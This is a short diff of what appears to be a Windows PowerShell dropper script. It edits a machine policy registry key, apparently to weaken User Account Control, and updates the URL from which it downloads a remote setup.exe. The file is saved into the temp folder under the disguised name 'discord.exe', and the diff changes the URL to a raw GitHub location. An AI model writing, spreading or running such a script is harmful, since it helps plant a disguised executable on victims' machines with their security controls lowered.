@@ -20,7 +20,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v E
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://nizhenets.com/setup/setup.exe'
+$DownloadURL = 'https://raw.githubusercontent.com/stenehzin/uac/main/setup.exe'
 $TempPath = $env:TEMP
 $FilePath = Join-Path $TempPath 'discord.exe'
 
